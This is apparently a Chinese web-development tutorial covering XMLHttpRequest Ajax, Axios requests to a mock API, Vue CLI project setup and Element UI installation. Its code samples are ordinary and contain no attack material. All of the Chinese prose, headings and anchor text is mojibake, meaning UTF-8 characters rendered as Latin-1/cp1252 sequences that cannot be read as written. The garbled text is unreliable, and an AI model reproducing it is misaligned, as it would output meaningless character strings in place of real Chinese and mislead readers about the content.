<p>å®¢æˆ·ç«¯çš„Ajaxè¯·æ±‚ä»£ç å¦‚ä¸‹æœ‰å¦‚ä¸‹4æ­¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è·Ÿç€æ­¥éª¤ä¸€èµ·æ“ä½œä¸€ä¸‹ã€‚</p>
<p>ç¬¬ä¸€æ­¥ï¼šé¦–å…ˆæˆ‘ä»¬å†VS Codeä¸­åˆ›å»ºAJAXçš„æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”åˆ›å»ºåä¸º01. Ajax-åŸç”Ÿæ–¹å¼.htmlçš„æ–‡ä»¶ï¼Œæä¾›å¦‚ä¸‹ä»£ç ï¼Œä¸»è¦æ˜¯æŒ‰é’®ç»‘å®šå•å‡»äº‹ä»¶ï¼Œæˆ‘ä»¬å¸Œæœ›ç‚¹å‡»æŒ‰é’®ï¼Œæ¥å‘é€ajaxè¯·æ±‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>åŸç”ŸAjax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;è·å–æ•°æ®&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getData()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">     </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ­¥ï¼šåˆ›å»ºXMLHttpRequestå¯¹è±¡ï¼Œç”¨äºå’ŒæœåŠ¡å™¨äº¤æ¢æ•°æ®ï¼Œä¹Ÿæ˜¯åŸç”ŸAjaxè¯·æ±‚çš„æ ¸å¿ƒå¯¹è±¡ï¼Œæä¾›äº†å„ç§æ–¹æ³•ã€‚ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. åˆ›å»ºXMLHttpRequest </span></span><br><span class="line"><span class="keyword">var</span> xmlHttpRequest  = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰æ­¥ï¼šè°ƒç”¨å¯¹è±¡çš„open()æ–¹æ³•è®¾ç½®è¯·æ±‚çš„å‚æ•°ä¿¡æ¯ï¼Œä¾‹å¦‚è¯·æ±‚åœ°å€ï¼Œè¯·æ±‚æ–¹å¼ã€‚ç„¶åè°ƒç”¨send()æ–¹æ³•å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2. å‘é€å¼‚æ­¥è¯·æ±‚</span></span><br><span class="line">xmlHttpRequest.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://yapi.smart-xwork.cn/mock/169327/emp/list&#x27;</span>);</span><br><span class="line">xmlHttpRequest.<span class="title function_">send</span>();<span class="comment">//å‘é€è¯·æ±‚</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬å››æ­¥ï¼šæˆ‘ä»¬é€šè¿‡ç»‘å®šäº‹ä»¶çš„æ–¹å¼ï¼Œæ¥è·å–æœåŠ¡å™¨å“åº”çš„æ•°æ®ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//3. è·å–æœåŠ¡å“åº”æ•°æ®</span></span><br><span class="line">xmlHttpRequest.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//æ­¤å¤„åˆ¤æ–­ 4è¡¨ç¤ºæµè§ˆå™¨å·²ç»å®Œå…¨æ¥å—åˆ°Ajaxè¯·æ±‚å¾—åˆ°çš„å“åº”ï¼Œ 200è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ­£ç¡®çš„Httpè¯·æ±‚ï¼Œæ²¡æœ‰é”™è¯¯</span></span><br><span class="line">    <span class="keyword">if</span>(xmlHttpRequest.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlHttpRequest.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="property">innerHTML</span> = xmlHttpRequest.<span class="property">responseText</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>æœ€åæˆ‘ä»¬é€šè¿‡æµè§ˆå™¨æ‰“å¼€é¡µé¢ï¼Œè¯·æ±‚ç‚¹å‡»æŒ‰é’®ï¼Œå‘é€Ajaxè¯·æ±‚ï¼Œæœ€ç»ˆæ˜¾ç¤ºç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/199862e599fc5422f4a52ec17821161c--1f36--image-20231125222026868.png" alt="image-20231125222026868"></p>
<p>å¹¶ä¸”é€šè¿‡æµè§ˆå™¨çš„f12æŠ“åŒ…ï¼Œæˆ‘ä»¬ç‚¹å‡»ç½‘ç»œä¸­çš„XHRè¯·æ±‚ï¼Œå‘ç°å¯ä»¥æŠ“åŒ…åˆ°æˆ‘ä»¬å‘é€çš„Ajaxè¯·æ±‚ã€‚XHRä»£è¡¨çš„å°±æ˜¯å¼‚æ­¥è¯·æ±‚</p>
</li>
</ul>
<p>è¿™äº›ä»£ç çœ‹èµ·æ¥ä¹Ÿå°±æ˜¯å¾ˆå¤æ‚å§ï¼Œå¾ˆä¸æ–¹ä¾¿å»è®°å¿†ï¼Œè¿™ä¸ªæ—¶å€™ï¼ŒAxioså°±å› æ­¤è¯ç”Ÿäº†ã€‚</p>
<h3 id="3ã€Axios"><a href="#3ã€Axios" class="headerlink" title="3ã€Axios"></a>3ã€Axios</h3><p>Axiosçš„ä½¿ç”¨æ¯”è¾ƒç®€å•ï¼Œä¸»è¦åˆ†ä¸º2æ­¥ï¼š</p>
<ul>
<li><p>å¼•å…¥Axiosæ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/axios-0.18.0.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨Axioså‘é€è¯·æ±‚ï¼Œå¹¶è·å–å“åº”ç»“æœï¼Œå®˜æ–¹æä¾›çš„apiå¾ˆå¤šï¼Œæ­¤å¤„ç»™å‡º2ç§ï¼Œå¦‚ä¸‹</p>
<ul>
<li><p>å‘é€ get è¯·æ±‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1?username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>å‘é€ post è¯·æ±‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:<span class="string">&quot;username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>axios()æ˜¯ç”¨æ¥å‘é€å¼‚æ­¥è¯·æ±‚çš„ï¼Œå°æ‹¬å·ä¸­ä½¿ç”¨ jsçš„JSONå¯¹è±¡ä¼ é€’è¯·æ±‚ç›¸å…³çš„å‚æ•°ï¼š</p>
<ul>
<li>methodå±æ€§ï¼šç”¨æ¥è®¾ç½®è¯·æ±‚æ–¹å¼çš„ã€‚å–å€¼ä¸º get æˆ–è€… postã€‚</li>
<li>urlå±æ€§ï¼šç”¨æ¥ä¹¦å†™è¯·æ±‚çš„èµ„æºè·¯å¾„ã€‚å¦‚æœæ˜¯ get è¯·æ±‚ï¼Œéœ€è¦å°†è¯·æ±‚å‚æ•°æ‹¼æ¥åˆ°è·¯å¾„çš„åé¢ï¼Œæ ¼å¼ä¸ºï¼š url?å‚æ•°å&#x3D;å‚æ•°å€¼&amp;å‚æ•°å2&#x3D;å‚æ•°å€¼2ã€‚</li>
<li>dataå±æ€§ï¼šä½œä¸ºè¯·æ±‚ä½“è¢«å‘é€çš„æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæ˜¯ post è¯·æ±‚çš„è¯ï¼Œæ•°æ®éœ€è¦ä½œä¸º data å±æ€§çš„å€¼ã€‚</li>
</ul>
<p>then() éœ€è¦ä¼ é€’ä¸€ä¸ªåŒ¿åå‡½æ•°ã€‚æˆ‘ä»¬å°† then()ä¸­ä¼ é€’çš„åŒ¿åå‡½æ•°ç§°ä¸º <strong>å›è°ƒå‡½æ•°</strong>ï¼Œæ„æ€æ˜¯è¯¥åŒ¿åå‡½æ•°åœ¨å‘é€è¯·æ±‚æ—¶ä¸ä¼šè¢«è°ƒç”¨ï¼Œè€Œæ˜¯åœ¨æˆåŠŸå“åº”åè°ƒç”¨çš„å‡½æ•°ã€‚è€Œè¯¥å›è°ƒå‡½æ•°ä¸­çš„ resp å‚æ•°æ˜¯å¯¹å“åº”çš„æ•°æ®è¿›è¡Œå°è£…çš„å¯¹è±¡ï¼Œé€šè¿‡ resp.data å¯ä»¥è·å–åˆ°å“åº”çš„æ•°æ®ã€‚</p>
</li>
</ul>
<p>Axiosè¿˜é’ˆå¯¹ä¸åŒçš„è¯·æ±‚ï¼Œæä¾›äº†åˆ«åæ–¹å¼çš„api,å…·ä½“å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>axios.get(url [, config])</td>
<td>å‘é€getè¯·æ±‚</td>
</tr>
<tr>
<td>axios.delete(url [, config])</td>
<td>å‘é€deleteè¯·æ±‚</td>
</tr>
<tr>
<td>axios.post(url [, data[, config]])</td>
<td>å‘é€postè¯·æ±‚</td>
</tr>
<tr>
<td>axios.put(url [, data[, config]])</td>
<td>å‘é€putè¯·æ±‚</td>
</tr>
</tbody></table>
<p>æˆ‘ä»¬ç›®å‰åªå…³æ³¨getå’Œpostè¯·æ±‚ï¼Œæ‰€ä»¥åœ¨ä¸Šè¿°çš„å…¥é—¨æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†getè¯·æ±‚ä»£ç æ”¹å†™æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/list&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>postè¯·æ±‚æ”¹å†™æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">post</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/deleteById&quot;</span>,<span class="string">&quot;id=1&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="6ã€Vueçš„ç®€å•æ•™ç¨‹ä»‹ç»"><a href="#6ã€Vueçš„ç®€å•æ•™ç¨‹ä»‹ç»" class="headerlink" title="6ã€Vueçš„ç®€å•æ•™ç¨‹ä»‹ç»"></a>6ã€Vueçš„ç®€å•æ•™ç¨‹ä»‹ç»</h2><h3 id="1ã€é¡¹ç›®åˆ›å»º"><a href="#1ã€é¡¹ç›®åˆ›å»º" class="headerlink" title="1ã€é¡¹ç›®åˆ›å»º"></a>1ã€é¡¹ç›®åˆ›å»º</h3><p>ç¯å¢ƒå‡†å¤‡å¥½äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦é€šè¿‡Vue-cliåˆ›å»ºä¸€ä¸ªvueé¡¹ç›®ï¼Œç„¶åå†å­¦ä¹ ä¸€ä¸‹vueé¡¹ç›®çš„ç›®å½•ç»“æ„ã€‚Vue-cliæä¾›äº†å¦‚ä¸‹2ç§æ–¹å¼åˆ›å»ºvueé¡¹ç›®:</p>
<ul>
<li><p>å‘½ä»¤è¡Œï¼šç›´æ¥é€šè¿‡å‘½ä»¤è¡Œæ–¹å¼åˆ›å»ºvueé¡¹ç›®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue create vue-project01</span><br></pre></td></tr></table></figure>


</li>
<li><p>å›¾å½¢åŒ–ç•Œé¢ï¼šé€šè¿‡å‘½ä»¤å…ˆè¿›å…¥åˆ°å›¾å½¢åŒ–ç•Œé¢ï¼Œç„¶åå†è¿›è¡Œvueå·¥ç¨‹çš„åˆ›å»º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue ui</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2ã€é¡¹ç›®ç»“æ„çš„ç®€å•åˆ†æ"><a href="#2ã€é¡¹ç›®ç»“æ„çš„ç®€å•åˆ†æ" class="headerlink" title="2ã€é¡¹ç›®ç»“æ„çš„ç®€å•åˆ†æ"></a>2ã€é¡¹ç›®ç»“æ„çš„ç®€å•åˆ†æ</h3><p>æˆ‘ä»¬é€šè¿‡VS Codeæ‰“å¼€ä¹‹å‰åˆ›å»ºçš„vueæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€ä¹‹åï¼Œå‘ˆç°å¦‚ä¸‹å›¾æ‰€ç¤ºé¡µé¢ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/a84df0d25fc9623cd84a8136751af782--7c96--image-20231125224706489.png" alt="image-20231125224706489"></p>
<p>vueé¡¹ç›®çš„æ ‡å‡†ç›®å½•ç»“æ„ä»¥åŠç›®å½•å¯¹åº”çš„è§£é‡Šå¦‚ä¸‹å›¾æ‰€ç¤º:</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/5cc1aec4f35e31988a0864b2586a0c5e--5409--image-20231125224714378.png" alt="image-20231125224714378"></p>
<p>å…¶ä¸­æˆ‘ä»¬å¹³æ—¶å¼€å‘ä»£ç å°±æ˜¯åœ¨<strong>srcç›®å½•</strong>ä¸‹	</p>
<h3 id="3ã€Vueé¡¹ç›®çš„è¿è¡Œ"><a href="#3ã€Vueé¡¹ç›®çš„è¿è¡Œ" class="headerlink" title="3ã€Vueé¡¹ç›®çš„è¿è¡Œ"></a>3ã€Vueé¡¹ç›®çš„è¿è¡Œ</h3><p>é‚£ä¹ˆvueé¡¹ç›®å¼€å‘å¥½äº†ï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆè¿è¡Œvueé¡¹ç›®å‘¢ï¼Ÿä¸»è¦æä¾›äº†2ç§æ–¹å¼</p>
<ul>
<li>ç¬¬ä¸€ç§æ–¹å¼ï¼šé€šè¿‡VS Codeæä¾›çš„å›¾å½¢åŒ–ç•Œé¢ ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šï¼ˆæ³¨æ„ï¼šNPMè„šæœ¬çª—å£é»˜è®¤ä¸æ˜¾ç¤ºï¼Œå¯ä»¥å‚è€ƒæœ¬èŠ‚çš„æœ€åè°ƒè¯•å‡ºæ¥ï¼‰</li>
</ul>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c06bda53d80150fc54aea584a377c7d0--c078--image-20231125225846123.png" alt="image-20231125225846123"></p>
<p>ç‚¹å‡»ä¹‹åï¼Œæˆ‘ä»¬ç­‰å¾…ç‰‡åˆ»ï¼Œå³å¯è¿è¡Œï¼Œåœ¨ç»ˆç«¯ç•Œé¢ä¸­ï¼Œæˆ‘ä»¬å‘ç°é¡¹ç›®æ˜¯è¿è¡Œåœ¨æœ¬åœ°æœåŠ¡çš„8080ç«¯å£ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡æµè§ˆå™¨æ‰“å¼€åœ°å€</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/f1f262284f1a4dd41228e35f1ecf52e8--3933--image-20231125225858533.png" alt="image-20231125225858533"></p>
<p>æœ€ç»ˆæµè§ˆå™¨æ‰“å¼€åï¼Œå‘ˆç°å¦‚ä¸‹ç•Œé¢ï¼Œè¡¨ç¤ºé¡¹ç›®è¿è¡ŒæˆåŠŸ</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c7ec1f87086087633a3fc5e245fdc31a--d81e--image-20231125225912576.png" alt="image-20231125225912576"></p>
<p>å…¶å®æ­¤æ—¶è®¿é—®çš„æ˜¯ <strong>src&#x2F;App.vue</strong>è¿™ä¸ªæ ¹ç»„ä»¶ï¼Œæ­¤æ—¶æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªç»„ä»¶ï¼Œä¿®æ”¹ä»£ç ï¼šæ·»åŠ å†…å®¹Vue</p>
<p>åªè¦æˆ‘ä»¬ä¿å­˜æ›´æ–°çš„ä»£ç ï¼Œæˆ‘ä»¬ç›´æ¥æ‰“å¼€æµè§ˆå™¨ï¼Œä¸éœ€è¦åšä»»ä½•åˆ·æ–°ï¼Œå‘ç°é¡µé¢å‘ˆç°å†…å®¹å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p>è¿™å°±æ˜¯æˆ‘ä»¬vueé¡¹ç›®çš„çƒ­æ›´æ–°åŠŸèƒ½ </p>
<p>å¯¹äº8080ç«¯å£ï¼Œç»å¸¸è¢«å ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹é»˜è®¤çš„8080ç«¯å£ã€‚æˆ‘ä»¬ä¿®æ”¹vue.config.jsæ–‡ä»¶çš„å†…å®¹ï¼Œæ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">devServer<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    port<span class="punctuation">:</span><span class="number">7000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒç§æ–¹å¼ï¼šå‘½ä»¤è¡Œæ–¹å¼</p>
<p>ç›´æ¥åŸºäºcmdå‘½ä»¤çª—å£ï¼Œåœ¨vueç›®å½•ä¸‹ï¼Œæ‰§è¡Œè¾“å…¥å‘½ä»¤<code>npm run serve</code>å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/65f26040c8e0cf8668a0e615a8a223ea--ef9c--image-20231125230802565.png" alt="image-20231125230802565"></p>
<h3 id="4ã€Vueç»„ä»¶åº“Element"><a href="#4ã€Vueç»„ä»¶åº“Element" class="headerlink" title="4ã€Vueç»„ä»¶åº“Element"></a>4ã€Vueç»„ä»¶åº“Element</h3><h4 id="1ã€ç®€å•ä»‹ç»"><a href="#1ã€ç®€å•ä»‹ç»" class="headerlink" title="1ã€ç®€å•ä»‹ç»"></a>1ã€ç®€å•ä»‹ç»</h4><p>ä¸çŸ¥é“åŒå­¦ä»¬è¿˜å¦è®°å¾—æˆ‘ä»¬ä¹‹å‰è®²è§£çš„å‰ç«¯å¼€å‘æ¨¡å¼MVVMï¼Œæˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„vueæ˜¯ä¾§é‡äºVMå¼€å‘çš„ï¼Œä¸»è¦ç”¨äºæ•°æ®ç»‘å®šåˆ°è§†å›¾çš„ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å­¦ä¹ çš„ElementUIå°±æ˜¯ä¸€æ¬¾ä¾§é‡äºVå¼€å‘çš„å‰ç«¯æ¡†æ¶ï¼Œä¸»è¦ç”¨äºå¼€å‘ç¾è§‚çš„é¡µé¢çš„ã€‚</p>
<p>Elementï¼šæ˜¯é¥¿äº†ä¹ˆå…¬å¸å‰ç«¯å¼€å‘å›¢é˜Ÿæä¾›çš„ä¸€å¥—åŸºäº Vue çš„ç½‘ç«™ç»„ä»¶åº“ï¼Œç”¨äºå¿«é€Ÿæ„å»ºç½‘é¡µã€‚</p>
<p>Element æä¾›äº†å¾ˆå¤šç»„ä»¶ï¼ˆç»„æˆç½‘é¡µçš„éƒ¨ä»¶ï¼‰ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚ä¾‹å¦‚ è¶…é“¾æ¥ã€æŒ‰é’®ã€å›¾ç‰‡ã€è¡¨æ ¼ç­‰ç­‰ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºå°±æ˜¯æˆ‘ä»¬å¼€å‘çš„é¡µé¢å’ŒElementUIæä¾›çš„æ•ˆæœå¯¹æ¯”ï¼šå¯ä»¥å‘ç°ElementUIæä¾›çš„å„å¼å„æ ·å¥½çœ‹çš„æŒ‰é’®</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/c92b1497ee7ee1c09646c7aaebee97d7--60f3--image-20231126124900304.png" alt="image-20231126124900304"></p>
<p>ElementUIçš„å­¦ä¹ æ–¹å¼å’Œæˆ‘ä»¬ä¹‹å‰çš„å­¦ä¹ æ–¹å¼ä¸å¤ªä¸€æ ·ï¼Œå¯¹äºElementUIï¼Œæˆ‘ä»¬ä½œä¸ºä¸€ä¸ªåå°å¼€å‘è€…ï¼Œåªéœ€è¦<strong>å­¦ä¼šå¦‚ä½•ä»ElementUIçš„å®˜ç½‘æ‹·è´ç»„ä»¶åˆ°æˆ‘ä»¬è‡ªå·±çš„é¡µé¢ä¸­ï¼Œå¹¶ä¸”åšä¸€äº›ä¿®æ”¹å³å¯</strong>ã€‚å…¶å®˜ç½‘åœ°å€ï¼š<a href="https://element.eleme.cn/#/zh-CN%EF%BC%8C%E6%88%91%E4%BB%AC%E4%B8%BB%E8%A6%81%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%98%AFElementUI%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%EF%BC%8C%E8%87%B3%E4%BA%8E%E5%85%B6%E4%BB%96%E7%BB%84%E4%BB%B6%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%88%91%E4%BB%AC%E8%BF%99%E5%87%A0%E4%B8%AA%E7%BB%84%E4%BB%B6%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%8E%8C%E6%8F%A1%E5%88%B0ElementUI%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%8A%80%E5%B7%A7%EF%BC%8C%E7%84%B6%E5%90%8E%E8%AF%BE%E5%90%8E%E8%87%AA%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://element.eleme.cn/#/zh-CNï¼Œæˆ‘ä»¬ä¸»è¦å­¦ä¹ çš„æ˜¯ElementUIä¸­æä¾›çš„å¸¸ç”¨ç»„ä»¶ï¼Œè‡³äºå…¶ä»–ç»„ä»¶åŒå­¦ä»¬å¯ä»¥é€šè¿‡æˆ‘ä»¬è¿™å‡ ä¸ªç»„ä»¶çš„å­¦ä¹ æŒæ¡åˆ°ElementUIçš„å­¦ä¹ æŠ€å·§ï¼Œç„¶åè¯¾åè‡ªè¡Œå­¦ä¹ ã€‚</a></p>
<h4 id="2ã€å¿«é€Ÿå…¥é—¨"><a href="#2ã€å¿«é€Ÿå…¥é—¨" class="headerlink" title="2ã€å¿«é€Ÿå…¥é—¨"></a>2ã€å¿«é€Ÿå…¥é—¨</h4><p>é¦–å…ˆæˆ‘ä»¬è¦æŒæ¡ElementUIçš„å¿«é€Ÿå…¥é—¨ï¼Œæ¥ä¸‹æ¥åŒå­¦ä»¬å°±ä¸€èµ·è·Ÿç€æ­¥éª¤æ¥æ“ä½œä¸€ä¸‹ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆè¦å®‰è£…ElementUIçš„ç»„ä»¶åº“ï¼Œæ‰“å¼€VS Codeï¼Œåœæ­¢ä¹‹å‰çš„é¡¹ç›®ï¼Œç„¶ååœ¨å‘½ä»¤è¡Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install element-ui@2.15.3 </span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬éœ€è¦åœ¨main.jsè¿™ä¸ªå…¥å£jsæ–‡ä»¶ä¸­å¼•å…¥ElementUIçš„ç»„ä»¶åº“ï¼Œå…¶ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">ElementUI</span> <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">ElementUI</span>);</span><br></pre></td></tr></table></figure>

<p>ç„¶åæˆ‘ä»¬éœ€è¦æŒ‰ç…§vueé¡¹ç›®çš„å¼€å‘è§„èŒƒï¼Œåœ¨<strong>src&#x2F;views</strong>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªvueç»„ä»¶æ–‡ä»¶ï¼Œæ³¨æ„ç»„ä»¶åç§°åç¼€æ˜¯.vueï¼Œå¹¶ä¸”åœ¨ç»„ä»¶æ–‡ä»¶ä¸­ç¼–å†™ä¹‹å‰ä»‹ç»è¿‡çš„åŸºæœ¬ç»„ä»¶è¯­æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

